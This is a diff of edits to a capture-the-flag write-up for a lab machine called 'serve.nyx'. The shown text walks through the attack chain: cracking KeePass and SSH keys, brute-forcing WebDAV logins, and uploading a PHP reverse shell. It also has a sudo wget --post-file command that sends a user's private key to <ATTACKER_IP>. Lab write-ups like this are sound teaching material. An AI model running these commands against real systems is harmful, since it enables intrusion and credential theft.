@@ -14,9 +14,9 @@ A KeePass database found through directory discovery is cracked, and one of its 
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn serve.nyx
@@ -27,7 +27,7 @@ PORT   STATE SERVICE REASON
 MAC Address: 08:00:27:4F:EF:6D (Oracle VirtualBox virtual NIC)
 ```
 
-Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
+Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80 -sCV serve.nyx
@@ -52,9 +52,10 @@ The main page:
 ```
 http://serve.nyx
 ```
+
 <img src="../Images/serve/Pasted image 20260517213505.png"/>
 
-Two directory scans run — one against the site root, one specifically against a `/secrets` path once it's found:
+Two directory scans run — one against the site root, one specifically against a `/secrets` path once it turns up:
 
 ```bash
 $ gobuster dir -u 'http://serve.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
@@ -92,6 +93,7 @@ Finished
 ```
 http://serve.nyx/notes.txt
 ```
+
 <img src="../Images/serve/Pasted image 20260517213630.png"/>
 
 ```
@@ -114,7 +116,7 @@ A `.kdbx` file sits inside `/secrets`:
 $ curl -s 'http://serve.nyx/secrets/db.kdbx' --output db.kdbx
 ```
 
-Its master password hash is extracted and cracked:
+`keepass2john` extracts the master password hash and `john` cracks it:
 
 ```bash
 $ keepass2john db.kdbx > kpass.txt
@@ -140,6 +142,7 @@ The database opens, revealing a password with its last three characters masked o
 ```bash
 $ keepassxc
 ```
+
 <img src="../Images/serve/Pasted image 20260517213735.png"/>
 <img src="../Images/serve/Pasted image 20260517213755.png"/>
 
@@ -147,7 +150,7 @@ $ keepassxc
 
 ### Filling the Gap with a Mask Attack
 
-Rather than guess, the unknown suffix is brute-forced directly. `crunch` generates every 9-character candidate that starts with the known prefix, with `%` standing in for a numeric digit in each of the last three positions:
+Rather than guess, the unknown suffix gets brute-forced directly. `crunch` generates every 9-character candidate that starts with the known prefix, with `%` standing in for a numeric digit in each of the last three positions:
 
 ```bash
 $ crunch 9 9 -t w3bd4v%%% -o dictionary.txt
@@ -183,11 +186,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-17 18:33:
 ```
 http://serve.nyx/webdav/
 ```
+
 <img src="../Images/serve/Pasted image 20260517214000.png"/>
 <img src="../Images/serve/Pasted image 20260517214012.png"/>
 
-
-WebDAV allows uploading files directly via `PUT`. A PHP reverse shell is uploaded and then requested to trigger it:
+WebDAV allows uploading files directly via `PUT`. A PHP reverse shell goes up that way, then a request triggers it:
 
 ```bash
 $ curl -T rev_shell.php http://serve.nyx/webdav/ --digest -u admin:w3bd4v513
@@ -219,7 +222,7 @@ www-data@serve:~$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-The shell is upgraded to something usable:
+A quick pty upgrade makes the shell usable:
 
 ```bash
 python3 -c 'import pty; pty.spawn ("/bin/bash")'
@@ -242,7 +245,7 @@ User www-data may run the following commands on Serve:
     (teo) NOPASSWD: /usr/bin/wget
 ```
 
-The current user can run `wget` as `teo` via `sudo`, with `--post-file` pointed at any local path. That flag uploads a file's contents as the body of an HTTP POST request — which means any file `teo` can read gets sent straight to an attacker-controlled listener, `teo`'s own SSH key included:
+The current user can run `wget` as `teo` via `sudo`, and `--post-file` points at any local path. That flag uploads a file's contents as the body of an HTTP POST request — so any file `teo` can read gets sent straight to an attacker-controlled listener, `teo`'s own SSH key included:
 
 ```bash
 www-data@serve:/$ sudo -u teo /usr/bin/wget --post-file=/home/teo/.ssh/id_rsa <ATTACKER_IP>:<PORT>
@@ -289,13 +292,14 @@ FvzKoh9Wdk4D1yGoLUd8wJNV90
 -----END RSA PRIVATE KEY-----
 ```
 
-The key is passphrase-protected. It's saved locally and cracked:
+The key is passphrase-protected. Saved locally, `ssh2john` extracts the hash and `john` cracks it:
 
 ```bash
 $ nano teo_rsa
 $ chmod 600 teo_rsa
 $ ssh2john teo_rsa > teo_rsa.hash
 ```
+
 ```bash
 $ john teo_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -314,9 +318,7 @@ Session completed.
 
 ```bash
 $ ssh -i teo_rsa teo@serve.nyx
-Warning: Permanently added 'serve.nyx' (ED25519) to the list of known hosts.
 Enter passphrase for key 'teo_rsa':
-Linux serve 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
 teo@serve:~$ id
 uid=1000(teo) gid=1000(teo) groups=1000(teo)
 teo@serve:~$ ls -l /home/teo/
@@ -341,7 +343,7 @@ User teo may run the following commands on Serve:
     (root) NOPASSWD: /usr/local/bin/bro
 ```
 
-`teo` can run `/usr/local/bin/bro` as root. It's a custom tool, not something with a documented GTFOBins entry, so its behavior is checked directly:
+`teo` can run `/usr/local/bin/bro` as root. It's a custom tool with no documented GTFOBins entry, so its behavior is worth checking directly:
 
 ```bash
 teo@serve:~$ sudo /usr/local/bin/bro
@@ -352,6 +354,7 @@ Bro! Specify a command first!
     * Use bro help for more info
 teo@serve:~$ sudo /usr/local/bin/bro curl
 ```
+
 <img src="../Images/serve/Pasted image 20260517214348.png"/>
 
 One of its subcommands (`curl`) drops into a mode that accepts a shell escape — the same pattern seen in tools like `less`, `vi`, or `ftp`, where a leading `!` runs the rest of the line as a shell command instead of passing it to the tool itself:
